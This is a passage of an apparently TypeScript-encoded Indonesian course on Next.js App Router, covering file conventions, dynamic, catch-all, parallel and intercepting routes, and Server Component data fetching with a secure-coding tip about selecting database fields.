          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Struktur App Router berbasis konvensi nama, dan sebagian besar kesalahan berasal dari membawa kebiasaan Pages Router.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memakai `index.tsx` untuk membuat rute',
            'Itu cara Pages Router',
            'Di App Router hanya `page.tsx` yang menjadi rute. Berkas lain diabaikan',
          ],
          [
            'Takut menaruh komponen di dalam `app`',
            'Nanti jadi rute',
            'Hanya nama konvensi yang menjadi rute. Komponen aman ditaruh di sana, dan folder berawalan garis bawah menegaskannya',
          ],
          [
            'Membuat satu layout raksasa dengan percabangan',
            'Supaya satu tempat',
            'Grup dengan tanda kurung memberi layout berbeda tanpa percabangan dan tanpa mengubah alamat',
          ],
          [
            'Memakai `template.tsx` tanpa alasan',
            'Namanya mirip layout',
            'Ia digambar ulang tiap navigasi sehingga state di dalamnya hilang. Pakai `layout.tsx` kecuali reset memang diinginkan',
          ],
          [
            'Menaruh `html` dan `body` di layout selain akar',
            'Konsisten dengan layout akar',
            'Hanya layout akar yang boleh memuatnya. Di tempat lain ia menghasilkan HTML yang tidak sah',
          ],
          [
            'Menyalin struktur dari tutorial Pages Router',
            'Sama-sama Next.js',
            'Konvensinya berbeda sepenuhnya. Periksa apakah tutorialnya memakai `getServerSideProps`, sebab itu penanda Pages Router',
          ],
        ],
      ),
      p(
        'Baris kedua sering membuat orang membuat folder `src/komponen` terpisah padahal tidak perlu. Menaruh komponen di sebelah halaman yang memakainya, misalnya `app/produk/_komponen/Kartu.tsx`, justru membuat keduanya mudah ditemukan bersama. Yang perlu dijaga hanya jangan menamainya dengan nama konvensi.',
      ),
      callout(
        'tip',
        'Cara cepat memeriksa rute apa saja yang benar-benar ada',
        'Setelah `next build`, keluarannya menampilkan tabel seluruh rute beserta jenisnya, yaitu statis atau dinamis. Kalau ada alamat yang kamu harapkan tidak muncul di sana, berkasnya bukan `page.tsx`. Kalau ada yang muncul tanpa kamu maksudkan, ada berkas konvensi yang tidak sengaja dibuat.',
      ),
      references(
        {
          label: 'Project structure and organization',
          href: 'https://nextjs.org/docs/app/getting-started/project-structure',
          source: 'Next.js',
          note: 'Daftar lengkap berkas khusus App Router beserta perannya masing-masing.',
        },
        {
          label: 'layout.js',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/layout',
          source: 'Next.js',
          note: 'Termasuk penegasan bahwa layout tidak di-render ulang saat berpindah antar anaknya.',
        },
        {
          label: 'template.js',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/template',
          source: 'Next.js',
          note: 'Kapan kamu justru menginginkan pemasangan ulang di tiap navigasi.',
        },
        {
          label: 'Route Groups',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/route-groups',
          source: 'Next.js',
          note: 'Mengelompokkan rute tanpa menambah segmen ke URL.',
        },
      ),
    ],
  ),

  written(
    'routing-lanjutan',
    'Routing: dynamic, group, parallel, intercepting',
    24,
    'Pola rute di luar yang sederhana.',
    [
      p('Empat pola rute yang menyelesaikan kebutuhan yang tidak bisa dijawab folder biasa.'),

      terms(
        {
          term: 'dynamic route',
          meaning:
            'Folder yang namanya dibungkus kurung siku, seperti `[lesson]`. Ia cocok dengan **nilai apa pun** di posisi itu, dan nilainya sampai ke halamanmu lewat `params`. Satu berkas melayani ratusan alamat berbeda.',
        },
        {
          term: 'params',
          meaning:
            'Objek berisi nilai segmen dinamis — `{ category, chapter, lesson }`. **Sejak Next.js 15 ia adalah `Promise` dan wajib di-`await`.** Tutorial yang menulis `params.id` langsung ditulis untuk versi lama dan akan gagal type-check di Next.js 16.',
        },
        {
          term: 'generateStaticParams',
          meaning:
            'Fungsi yang memberitahu Next.js **semua kombinasi `params` yang harus dibuat saat build**. Inilah yang mengubah satu berkas `page.tsx` menjadi 440 halaman HTML statis di website ini. Tanpanya, setiap kunjungan dirender di server.',
        },
        {
          term: 'catch-all segment',
          meaning:
            "`[...slug]` — menangkap **beberapa segmen sekaligus** menjadi array. `/dokumen/a/b/c` menghasilkan `['a','b','c']`. Versi kurung dua `[[...slug]]` membuatnya opsional, sehingga `/dokumen` tanpa lanjutan pun tetap cocok.",
        },
        {
          term: 'parallel route',
          meaning:
            'Folder berawalan `@`, seperti `@analitik`. Ia menjadi **prop** pada layout, bukan `children`. Manfaat sebenarnya bukan tata letak: setiap slot punya batas loading dan error **sendiri**, sehingga panel yang lambat tidak menahan panel lain.',
        },
        {
          term: 'slot',
          meaning:
            'Sebutan untuk satu parallel route yang diterima layout sebagai prop bernama. Layout memutuskan di mana masing-masing slot ditempatkan — dan karena slot berdiri sendiri, kegagalan salah satunya tidak menjatuhkan yang lain.',
        },
        {
          term: 'intercepting route',
          meaning:
            'Rute yang **mencegat** navigasi ke alamat lain dan menampilkannya dengan cara berbeda. Pola yang dipakai Instagram: diklik dari daftar, foto muncul sebagai modal; alamat yang sama dibuka langsung atau di-refresh, ia jadi halaman penuh.',
        },
        {
          term: 'penanda (.) (..) (...)',
          meaning:
            'Awalan folder yang menentukan **dari tingkat mana** sebuah rute dicegat. `(.)` tingkat yang sama, `(..)` satu tingkat di atas, `(...)` dari root `app`. Notasinya sengaja meniru path relatif di sistem berkas.',
        },
        {
          term: 'kegagalan sebagian',
          meaning:
            'Prinsip yang mendasari parallel route: satu widget yang gagal atau lambat **tidak boleh** menjatuhkan seluruh halaman. Di sini prinsip itu ditegakkan pada tingkat rute, bukan cuma tingkat komponen.',
        },
      ),

      h2('Dynamic route'),
      code(
        'tsx',
        `
        // app/kelas/[category]/[chapter]/[lesson]/page.tsx

        // Di Next.js 15+, params adalah Promise dan HARUS di-await.
        export default async function HalamanPelajaran({
          params,
        }: {
          params: Promise<{ category: string; chapter: string; lesson: string }>;
        }) {
          const { category, chapter, lesson } = await params;

          const isi = cariPelajaran(category, chapter, lesson);
          if (isi === undefined) notFound();

          return <Pelajaran isi={isi} />;
        }
        `,
      ),
      p(
        'Perhatikan tipe `params` adalah **`Promise`**, dan itu perubahan yang paling sering menjegal orang yang mengikuti tutorial lama. Karena berupa Promise, ia harus di-`await` sebelum isinya bisa dibaca, dan itu mungkin di sini justru karena komponennya `async`, sesuatu yang hanya bisa dilakukan Server Component. Ketiga nilai yang keluar (`category`, `chapter`, `lesson`) berpasangan tepat dengan tiga folder berkurung siku di struktur rutenya. Baris `if (isi === undefined) notFound()` menutup kasus yang wajib ditangani setiap rute dinamis, yaitu alamat yang bentuknya sah tetapi datanya tidak ada. `notFound()` bukan sekadar melempar error, sebab ia memberi tahu Next.js untuk menampilkan `not-found.tsx` **beserta status HTTP 404**, sehingga mesin pencari tidak mengindeks halaman kosong sebagai halaman yang sah.',
      ),
      callout(
        'warning',
        'Perubahan yang memutus kode lama',
        'Sebelum Next.js 15, `params` adalah objek biasa. Tutorial yang menulis `params.id` langsung akan gagal type-check di Next.js 16. Kalau kamu menemui contoh yang tidak memakai `await`, contoh itu ditulis untuk versi lama.',
      ),

      h2('Menghasilkan halaman statis dari data'),
      code(
        'tsx',
        `
        // Memberi tahu Next.js semua kombinasi yang harus dibuat saat build.
        export async function generateStaticParams() {
          return semuaPelajaran().map((p) => ({
            category: p.kategori,
            chapter: p.bab,
            lesson: p.slug,
          }));
        }
        `,
      ),
      p(
        'Inilah yang mengubah satu berkas `page.tsx` menjadi 440 halaman HTML statis di website ini. Tanpa fungsi ini, setiap kunjungan akan dirender di server.',
      ),

      h2('Catch-all segment'),
      code(
        'text',
        `
        app/dokumen/[...slug]/page.tsx
          /dokumen/a          -> slug: ['a']
          /dokumen/a/b/c      -> slug: ['a','b','c']
          /dokumen            -> 404

        app/dokumen/[[...slug]]/page.tsx   (opsional, kurung dua)
          /dokumen            -> slug: undefined   (cocok)
        `,
      ),
      p(
        'Bedanya dengan `[slug]` biasa ada pada **jumlah segmen yang ditangkap**. `[slug]` hanya cocok untuk satu segmen, sedangkan `[...slug]` menangkap berapa pun dan menyerahkannya sebagai **array**, bukan string. Itu yang membuat satu berkas bisa melayani `/dokumen/a` maupun `/dokumen/a/b/c`. Perhatikan baris ketiga, sebab `[...slug]` **tidak** cocok untuk `/dokumen` polos, karena ia menuntut minimal satu segmen. Bentuk kurung dua `[[...slug]]` menghapus tuntutan itu, sehingga alamat tanpa segmen tetap cocok, hanya `slug`-nya bernilai `undefined`. Karena itu kodenya wajib menangani kemungkinan `undefined`, dan pilihan antara keduanya sederhana, yaitu pakai kurung dua kalau halaman induknya sendiri juga perlu ditangani berkas yang sama.',
      ),

      h2('Parallel route: dua halaman dalam satu layout'),
      code(
        'text',
        `
        app/dasbor/
        ├── layout.tsx
        ├── page.tsx
        ├── @analitik/
        │   ├── page.tsx
        │   └── loading.tsx    <- punya keadaan loading SENDIRI
        └── @tim/
            ├── page.tsx
            └── error.tsx      <- punya keadaan error SENDIRI
        `,
      ),
      code(
        'tsx',
        `
        // Slot menjadi props, bukan children.
        export default function LayoutDasbor({
          children,
          analitik,
          tim,
        }: {
          children: React.ReactNode;
          analitik: React.ReactNode;
          tim: React.ReactNode;
        }) {
          return (
            <>
              {children}
              <div className="grid grid-cols-2 gap-4">
                {analitik}
                {tim}
              </div>
            </>
          );
        }
        `,
      ),
      p(
        'Manfaat sebenarnya: setiap slot punya batas loading dan error sendiri. Analitik yang lambat tidak menahan panel tim, dan panel tim yang gagal tidak menghapus analitik. Ini penerapan aturan "kegagalan sebagian tidak boleh menjatuhkan seluruh halaman" di tingkat rute.',
      ),

      h2('Intercepting route: modal yang punya URL'),
      code(
        'text',
        `
        app/
        ├── foto/
        │   └── [id]/page.tsx        <- halaman penuh (saat dibuka langsung)
        └── @modal/
            └── (.)foto/
                └── [id]/page.tsx    <- modal (saat diklik dari daftar)
        `,
      ),
      p(
        'Diklik dari daftar, foto muncul sebagai modal di atas daftarnya. Alamat itu dibuka langsung atau di-refresh, ia jadi halaman penuh. Pola yang dipakai Instagram — dan yang membuat tombol kembali berperilaku benar.',
      ),
      table(
        ['Penanda', 'Arti'],
        [
          ['`(.)`', 'Cegat segmen di tingkat yang sama'],
          ['`(..)`', 'Cegat satu tingkat di atas'],
          ['`(...)`', 'Cegat dari root `app`'],
        ],
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Katalog produk butuh empat bentuk rute sekaligus, yaitu daftar di `/produk`, detail di `/produk/7`, kategori bertingkat di `/produk/pria/atasan/kaos`, dan halaman detail yang bisa dibuka sebagai dialog di atas daftar saat diklik dari daftar tapi menjadi halaman penuh saat alamatnya dibuka langsung. Yang terakhir terdengar rumit dan sebenarnya adalah satu konvensi berkas.',
      ),
      table(
        ['Bentuk folder', 'Cocok untuk', 'Contoh alamat'],
        [
          ['`[id]`', 'Satu segmen yang berubah', '`/produk/7`'],
          ['`[...jalur]`', 'Satu segmen atau lebih, **wajib ada**', '`/produk/pria/atasan`'],
          ['`[[...jalur]]`', 'Nol segmen atau lebih, boleh kosong', '`/produk` dan `/produk/pria`'],
          ['`(nama)`', 'Grup, tidak muncul di alamat', '`(toko)/produk` → `/produk`'],
          ['`@nama`', 'Slot paralel, dirender bersamaan', 'dua panel di satu halaman'],
          ['`(.)nama`', 'Cegat rute dari tingkat yang sama', 'detail sebagai dialog'],
        ],
        'Dua baris terakhir jarang dipakai dan menyelesaikan masalah yang tidak punya jalan lain.',
      ),
      code(
        'tsx',
        `
        // Rute dinamis. Di Next.js 15 ke atas, params adalah PROMISE.
        export default async function HalamanProduk({
          params,
          searchParams,
        }: {
          params: Promise<{ id: string }>;
          searchParams: Promise<{ [k: string]: string | string[] | undefined }>;
        }) {
          const { id } = await params;
          const { tab } = await searchParams;

          const produk = await ambilProduk(id);
          if (!produk) notFound();      // memicu not-found.tsx terdekat

          return <DetailProduk produk={produk} tabAktif={tab ?? 'ringkasan'} />;
        }

        // Menentukan alamat mana yang dibangun saat build.
        export async function generateStaticParams() {
          const produk = await ambilSeluruhProduk();
          return produk.map((p) => ({ id: p.id }));
        }
        `,
        { filename: 'app/produk/[id]/page.tsx' },
      ),
      p(
        'Bahwa `params` berupa janji adalah perubahan yang menyandung banyak orang saat memutakhirkan dari versi lama. Alasannya, Next.js perlu bisa mulai merender sebelum seluruh informasi permintaan tersedia. Konsekuensinya, komponen halaman yang memakainya wajib `async` dan nilainya wajib di-`await`.',
      ),
      p(
        'Fungsi `generateStaticParams` menentukan alamat mana yang dibangun sebagai HTML statis saat build. Tanpa itu, seluruh alamat dinamis dirender saat diminta. Dengan itu, produk yang sudah ada saat build tersaji seketika dari berkas statis. Ini salah satu keputusan performa terbesar di App Router, dan ia hanya beberapa baris.',
      ),
      code(
        'text',
        `
        Rute pencegat, untuk detail yang bisa jadi dialog:

        app/
          produk/
            page.tsx                    -> daftar produk
            [id]/
              page.tsx                  -> /produk/7 sebagai halaman penuh
          @dialog/
            (.)produk/
              [id]/
                page.tsx                -> /produk/7 sebagai dialog di atas daftar
            default.tsx                 -> WAJIB, tampilan saat slot kosong

        Diklik dari daftar   -> dicegat, tampil sebagai dialog
        Alamat dibuka langsung -> tidak dicegat, tampil sebagai halaman penuh
        Muat ulang saat dialog terbuka -> menjadi halaman penuh
        `,
        { caption: 'Satu detail produk, dua cara tampil, satu berkas isi.' },
      ),
      p(
        'Berkas `default.tsx` di dalam slot paralel sering dilupakan dan menyebabkan 404 yang membingungkan. Ia adalah tampilan saat slot itu tidak punya isi, misalnya saat pengguna berada di `/produk` tanpa dialog terbuka. Tanpa `default.tsx`, Next.js tidak tahu apa yang harus dirender di slot itu dan seluruh rutenya gagal.',
      ),
      p(
        'Perlu jujur disebut bahwa rute pencegat dan slot paralel adalah bagian App Router yang paling rumit dan paling jarang dibutuhkan. Untuk sebagian besar aplikasi, rute dinamis biasa dan grup sudah cukup. Pakai keduanya hanya kalau kebutuhannya memang persis seperti kasus dialog di atas, sebab kerumitannya nyata.',
      ),
      callout(
        'warning',
        'Rute dinamis berarti dirender saat diminta, kecuali dibuat statis',
        'Alamat berbentuk `[id]` tanpa `generateStaticParams` akan dirender di server pada setiap permintaan. Untuk katalog dengan seribu produk yang jarang berubah, membangunnya sebagai statis jauh lebih cepat dan lebih murah. Keluaran `next build` menampilkan mana yang statis dan mana yang dinamis.',
      ),

      h2('Saat error-nya muncul'),
      p('Empat kegagalan berikut adalah yang paling sering pada routing lanjutan.'),
      code(
        'text',
        `
        export default function P({ params }: { params: { id: string } }) {
          return <div>{params.id}</div>;
        }

        # Di Next.js 15 ke atas, params adalah Promise.
        # Membaca .id langsung menghasilkan undefined atau peringatan.
        `,
        { caption: 'Bentuk lama dibawa ke versi baru.' },
      ),
      p(
        'Ini yang paling sering menyandung saat memutakhirkan. Gejalanya bisa berupa nilai `undefined`, peringatan tentang API yang harus di-`await`, atau tipe yang ditolak TypeScript kalau tipenya sudah dituliskan dengan benar. Perbaikannya menjadikan komponennya `async` lalu menulis `const { id } = await params`.',
      ),
      code(
        'text',
        `
        # app/@dialog/ dibuat tanpa default.tsx

        Error: 404 pada rute yang seharusnya ada.
        `,
        { caption: 'Slot paralel tanpa tampilan bawaan.' },
      ),
      p(
        'Slot paralel harus punya sesuatu untuk dirender pada setiap rute yang mungkin. Saat pengguna berada di alamat yang tidak mencocokkan isi slot itu, `default.tsx` yang dipakai. Tanpa itu, Next.js menyimpulkan rutenya tidak lengkap dan mengembalikan 404. Isinya boleh sesederhana `return null`.',
      ),
      code(
        'text',
        `
        # app/produk/[id]/page.tsx  DAN  app/produk/[slug]/page.tsx

        Error: You cannot use different slug names for the same dynamic path.
        `,
        { caption: 'Dua nama segmen dinamis untuk posisi yang sama.' },
      ),
      p(
        'Satu posisi dalam alamat hanya boleh punya satu nama segmen. Ini sering terjadi saat dua orang menambahkan rute yang sama dengan nama parameter berbeda, atau saat seseorang mengganti nama tanpa menghapus folder lama. Pilih satu nama, dan pastikan folder lamanya benar-benar terhapus.',
      ),
      code(
        'text',
        `
        # Katalog seribu produk, tanpa generateStaticParams.
        # Keluaran next build:

        └ ƒ /produk/[id]          # ƒ = dirender saat diminta

        # Setiap kunjungan memanggil database.
        `,
        { caption: 'Rute dinamis yang sebenarnya bisa statis.' },
      ),
      p(
        'Tidak ada error, dan biayanya berupa beban server yang tidak perlu serta halaman yang lebih lambat. Simbol di depan nama rute pada keluaran build adalah cara tercepat memeriksanya, yaitu lingkaran berarti statis dan huruf f berarti dirender saat diminta. Untuk data yang jarang berubah, `generateStaticParams` mengubahnya menjadi statis.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`params.id` bernilai `undefined`',
            '`params` adalah janji di Next.js 15 ke atas',
            'Jadikan komponennya `async`, lalu `await params`',
          ],
          [
            '404 pada rute yang seharusnya ada',
            'Slot paralel tanpa `default.tsx`',
            'Tambahkan `default.tsx`, boleh berisi `return null`',
          ],
          [
            '`cannot use different slug names for the same dynamic path`',
            'Dua nama segmen untuk posisi yang sama',
            'Pilih satu nama, hapus folder yang lain',
          ],
          [
            'Setiap kunjungan memanggil database',
            'Rute dinamis tanpa `generateStaticParams`',
            'Tambahkan untuk membangunnya sebagai statis',
          ],
          [
            'Segmen tambahan menghasilkan 404',
            '`[id]` hanya cocok satu segmen',
            'Pakai `[...jalur]` untuk beberapa segmen',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Routing lanjutan punya banyak konvensi, dan sebagian besar kesalahan berasal dari memakai yang rumit sebelum yang sederhana dicoba.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Membaca `params` tanpa `await`',
            'Dulu bisa langsung',
            'Sejak Next.js 15 ia janji. Komponennya wajib `async`',
          ],
          [
            'Memakai rute pencegat untuk dialog biasa',
            'Katanya itu cara yang benar',
            'Untuk dialog yang tidak perlu punya alamat sendiri, state biasa jauh lebih sederhana',
          ],
          [
            'Melupakan `generateStaticParams` pada katalog',
            'Rutenya kan dinamis',
            'Seluruh kunjungan memanggil database. Untuk data yang jarang berubah, bangun sebagai statis',
          ],
          [
            'Memakai `[...jalur]` padahal segmennya selalu satu',
            'Lebih fleksibel',
            'Nilainya menjadi array yang harus diurai. Pakai `[id]` kalau memang satu segmen',
          ],
          [
            'Melupakan `default.tsx` pada slot paralel',
            'Slotnya kan sudah punya halaman',
            'Slot harus punya tampilan untuk rute yang tidak mencocokkannya, kalau tidak hasilnya 404',
          ],
          [
            'Memakai grup untuk mengubah alamat',
            'Namanya folder juga',
            'Grup **tidak** muncul di alamat sama sekali. Untuk mengubah alamat, ganti nama foldernya',
          ],
        ],
      ),
      p(
        'Baris kedua layak ditegaskan sebab rute pencegat sering dipakai untuk hal yang tidak membutuhkannya. Pertanyaan yang memutuskan, apakah dialog itu perlu punya alamat sendiri yang bisa dibagikan dan bisa dibuka langsung. Kalau tidak, misalnya dialog konfirmasi hapus, state biasa jauh lebih sederhana dan tidak menambah satu pun konvensi.',
      ),
      callout(
        'info',
        'Keluaran `next build` adalah dokumentasi rute yang paling akurat',
        'Ia menampilkan seluruh rute yang benar-benar ada beserta jenisnya, dan itu satu-satunya sumber yang tidak bisa keliru. Kalau ada perbedaan antara yang kamu harapkan dan yang tertulis di sana, yang tertulis di sana yang benar. Bacalah setiap kali menambah atau mengubah struktur rute.',
      ),
      references(
        {
          label: 'Dynamic Routes',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/dynamic-routes',
          source: 'Next.js',
          note: 'Segmen `[param]`, catch-all `[...slug]`, dan bentuk opsionalnya.',
        },
        {
          label: 'generateStaticParams',
          href: 'https://nextjs.org/docs/app/api-reference/functions/generate-static-params',
          source: 'Next.js',
          note: 'Fungsi yang mengubah satu berkas rute menjadi ratusan halaman statis saat build.',
        },
        {
          label: 'Parallel Routes',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/parallel-routes',
          source: 'Next.js',
          note: 'Slot `@nama` beserta batas loading dan error independennya.',
        },
        {
          label: 'Intercepting Routes',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/intercepting-routes',
          source: 'Next.js',
          note: 'Arti penanda `(.)`, `(..)`, dan `(...)` beserta pola modal ber-URL.',
        },
      ),
    ],
  ),

  written(
    'server-component-fetching',
    'Server Component & Pengambilan Data',
    22,
    'Mengambil data tanpa `useEffect` sama sekali.',
    [
      p(
        'Di App Router, komponen adalah Server Component secara default, dan Server Component boleh `async`. Konsekuensinya: seluruh pola `useState` + `useEffect` + `fetch` yang kamu pelajari di Bab 7 tidak diperlukan lagi untuk pengambilan data awal.',
      ),

      terms(
        {
          term: 'komponen `async`',
          meaning:
            'Server Component boleh ditulis `async` dan memakai `await` langsung di badannya. Ini yang menghapus seluruh pola `useState` + `useEffect` + `fetch`: datanya sudah ada **sebelum** HTML dibuat, jadi tidak ada yang perlu ditunggu di browser.',
        },
        {
          term: 'waterfall',
          meaning:
            'Dibaca "woterfol", artinya **air terjun**. Permintaan yang berangkat berurutan padahal tidak saling membutuhkan — masing-masing menunggu yang sebelumnya selesai. Total waktunya jadi **jumlah** ketiganya, bukan yang terlama. Penyebab lambat paling sering di App Router.',
        },
        {
          term: 'Promise.all',
          meaning:
            'Menjalankan beberapa operasi asinkron **bersamaan** lalu menunggu semuanya selesai. Total waktunya menjadi selama yang paling lambat, bukan jumlah semuanya. Obat langsung untuk waterfall yang tidak disengaja.',
        },
        {
          term: 'deduplikasi',
          meaning:
            'Menggabungkan pemanggilan identik menjadi satu. React men-dedup `fetch` dengan URL dan opsi sama **dalam satu render** — jadi header, sidebar, dan konten yang sama-sama memanggil `ambilUser(id)` hanya menghasilkan satu permintaan.',
        },
        {
          term: 'cache() dari React',
          meaning:
            'Pembungkus yang memberi fungsi **non-`fetch`** perilaku deduplikasi yang sama — misalnya query database. Tanpanya, tiga komponen yang memanggil query yang sama menghasilkan tiga query sungguhan.',
        },
        {
          term: 'select',
          meaning:
            'Opsi query yang membatasi **field mana** yang diambil dari database. Di konteks ini ia bukan optimasi melainkan **kontrol keamanan**: ia yang memastikan `passwordHash` tidak pernah ikut ke objek yang dioper ke Client Component.',
        },
        {
          term: 'endpoint API',
          meaning:
            'Alamat server yang menerima permintaan dan mengembalikan data, biasanya JSON. Di App Router ia **tidak lagi wajib** untuk pengambilan data awal — komponen server bisa menyentuh database langsung. Ia tetap perlu untuk pemanggil di luar aplikasimu.',
        },
        {
          term: 'batas server–klien',
          meaning:
            'Garis tempat data berpindah dari server ke browser. Kemudahan menyentuh database langsung juga bahayanya: apa pun yang kamu **oper sebagai prop** melintasi garis ini, dan bisa dibaca siapa pun di payload RSC — meski field-nya tidak pernah dirender di layar.',
        },
      ),

      h2('Perbandingan langsung'),
      compare(
        {
          title: 'Client Component',
          lang: 'tsx',
          code: `
          'use client';

          function Produk({ id }) {
            const [data, setData] = useState(null);
            const [memuat, setMemuat] = useState(true);
            const [gagal, setGagal] = useState(null);

            useEffect(() => {
              const c = new AbortController();
              fetch(\`/api/produk/\${id}\`, { signal: c.signal })
                .then(r => r.json())
                .then(d => { setData(d); setMemuat(false); })
                .catch(e => {
                  if (e.name !== 'AbortError') setGagal(e);
                });
              return () => c.abort();
            }, [id]);

            if (memuat) return <Skeleton />;
            if (gagal) return <Gagal />;
            return <h1>{data.nama}</h1>;
          }
          `,
          notes: ['22 baris', 'Butuh endpoint API terpisah', 'Race condition harus diurus sendiri'],
        },
        {
          title: 'Server Component',
          lang: 'tsx',
          code: `
          async function Produk({ id }: { id: string }) {
            const produk = await db.produk.findUnique({
              where: { id },
            });

            if (!produk) notFound();

            return <h1>{produk.nama}</h1>;
          }
          `,
          notes: ['8 baris', 'Query database langsung', 'Tidak ada race condition'],
        },
      ),
      p(
        'Selisih 22 baris menjadi 8 itu bukan penghematan tulisan melainkan **pekerjaan yang tidak lagi perlu dilakukan**. Kolom kiri memerlukan tiga state hanya untuk melacak satu permintaan, `AbortController` untuk mencegah race condition, dan endpoint `/api/produk/[id]` terpisah yang harus ditulis, diamankan, dan dipelihara sendiri. Kolom kanan menghapus semuanya sekaligus. Karena komponennya berjalan di server, ia bisa `await` langsung ke database tanpa perantara HTTP, dan tanpa perjalanan jaringan tidak ada permintaan yang bisa saling mendahului. Keadaan memuat pun hilang dari komponen ini; ia diserahkan ke `loading.tsx` atau `Suspense` seperti dibahas sebelumnya. Yang tersisa hanya `notFound()` untuk data yang memang tidak ada, dan itu memang kondisi yang nyata, bukan konsekuensi cara pengambilan datanya.',
      ),

      h2('Query database langsung dari komponen'),
      p(
        'Karena kodenya hanya berjalan di server, tidak perlu ada endpoint API di antaranya. Komponen boleh menyentuh database, membaca berkas, atau memakai rahasia — semuanya tidak pernah sampai ke browser.',
      ),
      callout(
        'danger',
        'Batas ini harus dijaga sengaja',
        'Kemudahan ini juga bahayanya. Objek yang kamu kembalikan dari database **tidak boleh** dioper utuh ke Client Component — payload RSC-nya bisa dibaca siapa pun di browser, meski field-nya tidak pernah dirender. Pilih field yang benar-benar perlu, jangan `<Profil user={user} />` dengan `user` mentah dari database.',
      ),
      code(
        'tsx',
        `
        // BERBAHAYA
        const user = await db.user.findUnique({ where: { id } });
        return <ProfilKlien user={user} />;   // passwordHash ikut ke browser

        // AMAN
        const user = await db.user.findUnique({
          where: { id },
          select: { id: true, nama: true, avatar: true },
        });
        return <ProfilKlien user={user} />;
        `,
      ),
      p(
        'Kedua versi memanggil query yang sama dan merender komponen yang sama, dan bedanya hanya **satu baris `select`**. Tanpa `select`, `findUnique` mengembalikan seluruh kolom baris itu, termasuk `passwordHash`, alamat email internal, dan apa pun yang kebetulan ada di tabelnya. Karena objek itu lalu dioper sebagai prop ke Client Component, seluruh isinya ikut diserialisasi ke payload RSC dan **bisa dibaca siapa pun yang membuka DevTools**, meski tidak satu field pun dirender di layar. Yang berbahaya dari kesalahan ini adalah ia tidak punya gejala, sebab halamannya benar, tidak ada error, dan kebocorannya hanya terlihat kalau seseorang memeriksa payload-nya. Karena itu `select` layak diperlakukan sebagai kebiasaan alih-alih optimasi, jadi sebutkan field yang kamu butuhkan, jangan ambil semuanya lalu berharap.',
      ),

      h2('Permintaan paralel'),
      compare(
        {
          title: 'Berurutan (waterfall)',
          lang: 'tsx',
          code: `
          const user = await ambilUser(id);
          const pesanan = await ambilPesanan(id);
          const ulasan = await ambilUlasan(id);

          // Total = jumlah ketiganya
          `,
          notes: ['Masing-masing menunggu yang sebelumnya, padahal tidak saling butuh'],
        },
        {
          title: 'Paralel',
          lang: 'tsx',
          code: `
          const [user, pesanan, ulasan] = await Promise.all([
            ambilUser(id),
            ambilPesanan(id),
            ambilUlasan(id),
          ]);

          // Total = yang paling lambat
          `,
          notes: ['Ketiganya berangkat bersamaan'],
        },
      ),
      p(
        'Pakai `await` berurutan **hanya** kalau permintaan berikutnya benar-benar membutuhkan hasil sebelumnya. Kalau tidak, itu waterfall yang tidak disengaja — penyebab lambat yang paling sering di App Router.',
      ),

      h2('Deduplikasi otomatis'),
      code(
        'tsx',
        `
        // Ketiganya memanggil ambilUser(id) dengan argumen sama.
        // Dalam satu render, permintaannya hanya dikirim SEKALI.
        async function Header({ id }) { const u = await ambilUser(id); /* ... */ }
        async function Sidebar({ id }) { const u = await ambilUser(id); /* ... */ }
        async function Konten({ id }) { const u = await ambilUser(id); /* ... */ }
        `,
      ),
      p(
        'React men-dedup pemanggilan `fetch` dengan URL dan opsi yang sama dalam satu render. Untuk fungsi non-`fetch` seperti query database, bungkus dengan `cache()` dari React agar mendapat perilaku yang sama.',
      ),
      code(
        'ts',
        `
        import { cache } from 'react';

        export const ambilUser = cache(async (id: string) => {
          return db.user.findUnique({ where: { id } });
        });
        `,
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman detail pesanan dipindahkan ke App Router. Pengambilan datanya masih memakai `useEffect` seperti kebiasaan lama. Hasilnya, pengguna melihat skeleton selama delapan ratus milidetik pada setiap kunjungan, sebab urutannya menjadi server mengirim HTML kosong, peramban mengunduh bundel, menjalankannya, lalu baru memanggil API. Empat langkah, dan tiga di antaranya bisa dihapus.',
      ),
      compare(
        {
          title: 'Mengambil data di klien',
          lang: 'tsx',
          code: `
          'use client';

          export default function HalamanPesanan({ id }: { id: string }) {
            const [data, setData] = useState<Pesanan | null>(null);

            useEffect(() => {
              ambilPesanan(id).then(setData);
            }, [id]);

            if (!data) return <Skeleton />;
            return <Detail pesanan={data} />;
          }

          // Urutannya:
          // 1. Server kirim HTML kosong
          // 2. Peramban unduh bundel
          // 3. Bundel jalan
          // 4. Panggil API
          `,
          notes: ['Empat langkah sebelum isi tampil', 'Skeleton terlihat di setiap kunjungan'],
        },
        {
          title: 'Mengambil data di server',
          lang: 'tsx',
          code: `
          // Tanpa 'use client'. Server Component adalah bawaannya.

          export default async function HalamanPesanan({
            params,
          }: {
            params: Promise<{ id: string }>;
          }) {
            const { id } = await params;

            // Langsung ke database. Kredensialnya tidak pernah ke peramban.
            const pesanan = await db.pesanan.findUnique({ where: { id } });
            if (!pesanan) notFound();

            return <Detail pesanan={pesanan} />;
          }

          // Urutannya:
          // 1. Server ambil data, kirim HTML yang SUDAH berisi
          `,
          notes: ['Satu langkah', 'Isi sudah ada di HTML pertama'],
        },
      ),
      p(
        'Selisihnya bukan kecepatan jaringan melainkan **jumlah perjalanan bolak-balik**. Kolom kiri butuh peramban mengunduh dan menjalankan bundel lebih dulu sebelum permintaan datanya bahkan dimulai. Kolom kanan mengambil datanya di server yang biasanya berada satu jaringan dengan databasenya, lalu mengirim hasilnya sekaligus.',
      ),
      p(
